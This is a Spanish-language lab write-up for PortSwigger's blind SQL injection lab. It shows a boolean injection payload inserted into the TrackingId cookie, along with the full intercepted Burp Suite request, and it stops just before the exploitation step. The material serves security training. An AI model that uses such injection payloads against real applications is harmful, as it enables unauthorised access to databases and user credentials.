
<p align="center">
  <kbd><b>DRINUX CYBERSEGURIDAD</b></kbd>
  <h3 align="center">Auditor:Drx === Gustavo Gutierrez Sanchez</h3>
</p>

<div align="center">
<h1> Guia de ejercicios Sqliblind</h1>
<p>
Esta guia principalmente se da solucion a los ejercicios abordados en la pagina portswingger seccion SQLI Blind.
</p>
</div>

## Laboratorio: SQL Injection (UNION Attack) - Lab 11
## Platforma: PortSwigger Web Security Academy

En este laboratorio practicamos una vulnerabilidad que se llama sqli blind con respuestas condicionales y el problema nos indica que tiene una tabla llamada **users** con columnas **username** y **password**

Primeramente debemos detectar la vulnerabilidad para esto vamos a usar el operado logigo **AND** para realizar una evaluacion numerica y tratar de forzar una respuesta en este caso **Welcome back**.

Comando:

```sql
TrackingId=gjDYiq8ruqJCW8H5'AND'1'='1;
```
Peticion Interceptada en burpsuite:

```bash
GET /filter?category=Tech+gifts HTTP/2
Host: 0afd00ca04285d99800e8066008500d9.web-security-academy.net
Cookie: TrackingId=gjDYiq8ruqJCW8H5'AND'1'='1; session=i6CwvR7uhGxyRsBXOj0MHApGFDVo88aM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0afd00ca04285d99800e8066008500d9.web-security-academy.net/filter?category=Tech+gifts
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```
<img src="imagenes/img1.png">

y ahora probamos con una comparacion falsa para ver si obtenemos la misma respuesta

<img src="imagenes/img2.png">

Ya confirmamos que existe la vulnerabilidad ahora vamos a explotarla.
